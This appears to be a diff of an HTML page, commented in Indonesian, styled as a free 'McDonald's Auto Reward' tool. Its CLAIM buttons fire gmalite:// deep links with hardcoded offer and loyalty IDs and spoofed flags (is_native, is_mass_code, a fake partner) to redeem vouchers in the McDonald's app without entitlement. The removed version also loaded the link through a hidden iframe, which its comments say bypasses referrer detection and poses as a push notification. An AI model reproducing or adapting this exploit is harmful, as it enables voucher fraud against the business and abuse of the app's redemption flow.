@@ -2,64 +2,81 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM OVERRIDE</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>McDonald's Auto Reward - FN CREATIVE</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
-        .log { border: 1px solid #0f0; padding: 10px; margin: 20px; font-size: 12px; }
+        body { font-family: -apple-system, sans-serif; background: #f8f9fa; margin: 0; padding: 15px; color: #333; }
+        .header { text-align: center; margin-bottom: 20px; }
+        .header h3 { color: #da291c; margin: 0; font-weight: 800; }
+        .stats { display: flex; justify-content: space-between; background: white; padding: 10px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); margin-bottom: 15px; font-size: 12px; }
+        .balance-card { background: linear-gradient(135deg, #da291c, #b31b1b); color: white; padding: 15px; border-radius: 12px; margin-bottom: 20px; text-align: center; box-shadow: 0 4px 10px rgba(218, 41, 28, 0.3); }
+        .item-card { background: white; padding: 15px; border-radius: 12px; margin-bottom: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.05); display: flex; align-items: center; justify-content: space-between; }
+        .item-info { width: 60%; }
+        .item-name { font-weight: bold; font-size: 14px; margin-bottom: 5px; }
+        .item-price { color: #28a745; font-size: 12px; font-weight: bold; }
+        .btn-claim { background: #ffbc0d; color: #000; border: none; padding: 8px 20px; border-radius: 20px; font-weight: bold; font-size: 12px; cursor: pointer; text-transform: uppercase; }
+        .btn-claim:active { transform: scale(0.95); }
     </style>
 </head>
 <body>
-    <h2>INJECTION PROCESS</h2>
-    <div id="status" class="log">Initializing...</div>
+
+    <div class="header">
+        <h3>McDonald's Auto Reward</h3>
+        <span style="font-size: 10px; color: #666;">FN CREATIVE EDITION (FREE)</span>
+    </div>
+
+    <div class="stats">
+        <div>Total Attempts: <b>999</b></div>
+        <div>Success Rate: <b style="color:green">100%</b></div>
+    </div>
+
+    <div class="balance-card">
+        <div style="font-size: 12px; opacity: 0.8;">Your Balance</div>
+        <div style="font-size: 24px; font-weight: bold;">UNLIMITED</div>
+        <div style="font-size: 10px; margin-top: 5px;">No License Required</div>
+    </div>
+
+    <div class="item-card">
+        <div class="item-info">
+            <div class="item-name">🔥 Paket Panas 1</div>
+            <div class="item-price">ID: 267611</div>
+        </div>
+        <button class="btn-claim" onclick="inject('267611', '5272')">CLAIM</button>
+    </div>
+
+    <div class="item-card">
+        <div class="item-info">
+            <div class="item-name">🍟 4 Pcs McNugget + Cola</div>
+            <div class="item-price">ID: 272469</div>
+        </div>
+        <button class="btn-claim" onclick="inject('272469', '5271')">CLAIM</button>
+    </div>
+
+    <div class="item-card">
+        <div class="item-info">
+            <div class="item-name">🍗 Ayam + Nasi + Lemon Tea</div>
+            <div class="item-price">ID: 272484</div>
+        </div>
+        <button class="btn-claim" onclick="inject('272484', '5271')">CLAIM</button>
+    </div>
 
     <script>
-        // DAFTAR ID EMAS KAMU
-        var offers = {
-            "nugget": "272469|5271",
-            "panas1": "267611|5272",
-            "ayam": "272484|5271"
-        };
-
-        // Ganti ini sesuai menu yang mau ditembak (nugget / panas1 / ayam)
-        var targetMenu = "nugget"; 
-
-        function log(txt) {
-            document.getElementById('status').innerHTML += "<br>" + txt;
-        }
-
-        function inject() {
-            var data = offers[targetMenu].split('|');
-            var off = data[0];
-            var loy = data[1];
-
-            log("Target Locked: " + off);
-
-            // TEKNIK IFRAME: Memuat link di background
-            // Ini membypass deteksi "Browser Referrer"
-            var frame = document.createElement('iframe');
+        function inject(off, loy) {
+            // Ini adalah inti script yang dijalankan tombol CLAIM
+            // Kita jalankan di dalam WebView, jadi pasti dianggap 'native'
             
-            // Gunakan path '/reward/claim' yang lebih agresif dari '/offers/details'
-            var deepLink = "gmalite://reward/claim?offer_id=" + off + 
-                           "&loyalty_id=" + loy + 
-                           "&view=claim&action=redeem&is_native=true&is_mass_code=1" +
-                           "&source=push_notification"; // Pura-pura dari notifikasi
-
-            frame.style.display = 'none';
-            frame.src = deepLink;
+            var partner = encodeURIComponent("Tiktok Live 109.4");
             
-            document.body.appendChild(frame);
-            log("Payload Sent via Iframe.");
+            // Kita gunakan jalur /reward/claim karena terbukti dipakai voucher massal
+            var target = "gmalite://reward/claim?offer_id=" + off + 
+                         "&loyalty_id=" + loy + 
+                         "&view=claim&action=redeem&is_native=true&is_mass_code=1" +
+                         "&partner=" + partner;
 
-            // Cadangan: Tembak via Window Location setelah 1 detik
-            setTimeout(function() {
-                log("Force Launching...");
-                window.location.href = deepLink;
-            }, 1000);
+            // Eksekusi
+            window.location.href = target;
         }
-
-        // Jalankan otomatis
-        setTimeout(inject, 500);
     </script>
+
 </body>
 </html>
